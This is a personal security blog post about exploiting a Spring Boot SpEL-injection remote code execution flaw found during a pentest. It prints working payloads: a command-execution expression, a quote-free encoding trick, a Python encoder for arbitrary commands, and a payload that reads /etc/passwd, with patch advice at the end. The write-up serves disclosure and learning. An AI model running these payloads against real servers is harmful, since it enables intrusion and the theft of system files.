---
title:  "Spring Boot RCE"
date:   2017-02-02 23:11:23
categories: [security]
tags: [security][rce][pentest]
---


This is my very frist blog post which was pending for a long time (almost a year). I would like to share a particular Remote Code Execution (RCE) in Java Springboot framework. I was highly inspired to look into this vulnerability after I read this article by **David Vieira-Kurz**, which can be found at his [blog](http://secalert.net/#cve-2016-4977). His article talks about an RCE in the Spring Security OAuth framework and how the Whitelabel error page can be used to trigger code execution.

So this meant that any Whitelabel Error Page which reflected user input was vulnerable to it. This was because user input was being treated in as Springs Expression Language (***SpEL***). So during my pentest I had come across a particualr URL which triggered this Whitelabel Error page.

**URL:** `https://<domain>/BankDetailForm?id=abc${12*12}abc`

**Error Page:**
![alt text](../../images/initial_error.png "Initial Error")


My input of `abc${12*12}abc` was reflected as `abc144abc`. Then I wanted to perform a simple **id** and get the result on screen. I proceeded with the following payload:

**URI:** `/BankDetailForm?id=${T(java.lang.Runtime).getRuntime().exec('id')}`

**Payload:** `${T(java.lang.Runtime).getRuntime().exec('id')}`

**Error Page:**
![alt text](../../images/error_2.png "Payload Error")

Hmm.....I see nothing. The reflection gave back the input as it is. I double checked David's blog to see if I was doing anything wrong. I was unsure as to what went wrong. Was the payload incorrect or did I make a mistake with the braces?? Nope. Everything was correct but I was still not getting my desired output. After fiddling around for a few hours I decided to fireup a demo Springs app and try to recreate the same scenario. I tried with a basic `{5*5}` and got `25` printed beautifully onscreen. Then I tried doing an **id** and bam!!!, it did not execute. I knew that I had to dig deeper because this was eating me up. 

It got me thinking that quotes might have been encoded and might have broken the **exec()** command. Next thing was to look at the stack trace at the server and see what was wrong.

![alt text](../../images/debug_mode.png "Debugging")

So after debugging I could see that single & double quotes were URL encoded. The **exec()** method clearly takes an argument
as a string. Now I either need to find characters within the error code and take bits & pieces and pass it to exec using **substring()**, which is still pretty difficult or I need to find a way to pass my string without using double quotes or single qutoes. I wanted to go with the second approach. Java supports nested functions and if I'm able to find a method which can output `id` or `cat etc/passwd`, this would then be passed to **exec()** and then my payload would run successfully.

After going through some Java classes I stumbled upon the following:

``` ruby
java.lang.Character.toString(105) 
-> prints the characer 'i'
``` 

Now I need to concat the letter 'd' and I'm golden. Again concat() is a method and i'm going to nest the `character.toString` inside it as well.

``` ruby
java.lang.Character.toString(105).concat(T(java.lang.Character).toString(100))
-> prints the characters 'id'
``` 
Now crafting the final payload, I get the following:

~~~ ruby          
https://<domain>/BankDetailForm?id=${T(java.lang.Runtime).getRuntime().exec(T(java.
lang.Character).toString(105).concat(T(java.lang.Character).toString(100)))}
~~~
![alt text](../../images/rce_blind.png "id executes")

The **getRuntime()** method returns the runtime object which we got on screen. Now we have some sort of a Blind RCE with which we can run any commands. I wanted to go a step further and get the output on screen (just for fun). At this point I wanted to do a `cat etc/passwd` and print the result onto the Whitelabel Error page. This meant for every character I would need to write its ASCII equivalent in the format `concat(T(java.lang.Character).toString(<ascii value>))`. Wrote a quick sloppy python script to acheive this:

**Python Script:**

``` ruby
#!/usr/bin/env python
from __future__ import print_function
import sys

message = raw_input('Enter message to encode:')

print('Decoded string (in ASCII):\n')
for ch in message:
   print('.concat(T(java.lang.Character).toString(%s))' % ord(ch), end=""), 
print('\n')

```


Now to get the output of `cat etc/passwd` in the response, we will use the ***IOUtils*** class and call the **toString()** method. We can pass an input stream to this method and get the contents of the stream as a response.

~~~ ruby  
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).get
Runtime().exec(T(java.lang.Character).toString(99).concat(T(ja
va.lang.Character).toString(97)).concat(T(java.lang.Character).toStri
ng(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.la
ng.Character).toString(47)).concat(T(java.lang.Character).toString(10
1)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.C
haracter).toString(99)).concat(T(java.lang.Character).toString(47)).c
oncat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).
toString(97)).concat(T(java.lang.Character).toString(115)).concat
(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toStrin
g(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
~~~

The payload became quite huge. To sum up, I used the Apache IOUtils library. I converted `cat etc/passwd` into ASCII characters using the character class, passed this value to the **exec()** method and got the input stream and passed it to the `toString()` method of IOUtils class. Awesome isnt it. I tried this on the remote box and got the following.

![alt text](../../images/rce_new.jpg "etc/passwd")

All this hassle just to get around the single and double quotes. However I feel there might have been easier ways to go about it. Tackling out the hurdles and troubleshooting and debugging and finally getting what you want is such a serene feeling. This bug was a learning curve for me and I learned a lot of things alongside exploiting this. If you are using an older version of Spring Boot, I would highly advise you to upgrade it. The vulnearbilty has been patched since Spring Boot 1.2.8.

I hope you guys enjoyed this blog. Please feel free to let me know your thoughts or any doubts you have. You can also catch me up on [Twitter][twitter] or shoot me an email.


[twitter]:      https://twitter.com/0xdeadpool
